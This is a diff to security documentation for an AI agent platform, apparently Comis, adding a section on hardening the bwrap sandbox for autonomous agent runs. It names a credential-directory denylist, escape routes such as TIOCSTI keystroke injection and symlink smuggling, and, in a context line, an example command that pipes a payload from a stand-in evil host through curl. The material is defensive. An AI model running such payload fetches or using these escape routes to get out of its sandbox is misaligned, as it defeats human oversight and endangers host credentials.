@@ -143,6 +143,43 @@ $ exec command='echo $(curl https://evil.example.com/payload.sh)'
 For the full exec sandbox configuration, mount table, and platform notes,
 see [Exec Sandbox](/security/exec-sandbox).
 
+### Autonomy jail hardening
+
+When an agent runs an autonomy-bearing surface (the orchestrate/script runner),
+the bwrap jail is hardened beyond the baseline filesystem isolation. These
+controls are **defense-in-depth** -- each one stands alone if another is absent:
+
+- **Process hardening** -- `--new-session` (a fresh session keyring + no
+  controlling TTY, which neutralizes the TIOCSTI keystroke-injection escape) and
+  `--die-with-parent` (the jail dies with the daemon, no orphaned escape).
+- **Seccomp profile** -- an optional `--seccomp` BPF filter denies the dangerous
+  syscall surface (keyring, `ptrace`, `perf_event_open`, `bpf`, module loading)
+  while allowing what interpreters need. The filter is a precompiled blob
+  generated offline; when it is absent the jail **degrades gracefully** (the
+  other controls still apply) rather than failing to start.
+- **Bind-mount validator** -- every dynamic, caller- or agent-supplied bind
+  (workspace, temp dir, shared paths, read-only discovery paths) is screened
+  against a denylist backstop before it is mounted. A bind that resolves into a
+  system dir (`/etc`, `/proc`, `/sys`, `/dev`, `/root`, `/run`) or a credential
+  dir (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`, `~/.npm`, `~/.netrc`) -- or
+  a **symlink** whose real target does -- is **refused at jail construction**
+  (it fails loud; it is never silently mounted). Symlinks are resolved through
+  every ancestor, so a symlinked leaf cannot smuggle a blocked path past a naive
+  string check.
+- **Writable-path audit** -- no host-trusted writable path (the agent config,
+  hooks, cron jobs, `~/.nvm`, learned-memory/skill files, or the bound Node
+  binary) is mounted read-write, and no read-only mount of a *parent* lets a
+  not-yet-existing child config be **created** inside the jail.
+- **Namespace preflight** -- at startup Comis probes whether the host can build
+  an unprivileged user namespace. If it cannot, the autonomy posture **downshifts
+  to assistant** with a loud doctor/boot signal and a remediation hint -- it
+  **never** silently falls back to an unjailed run.
+- **Node-runtime honesty** -- surfaces that need `node` inside the jail probe for
+  it on the jail PATH; if absent, the daemon's own `node` binary is bound
+  **read-only**; if neither works, those surfaces are reported **unavailable**
+  with a loud signal. Comis **never** claims a "bundled Node" and **never**
+  silently runs them unjailed.
+
 ## What Happens When a Threat Is Found
 
 The response depends on the severity of the finding:
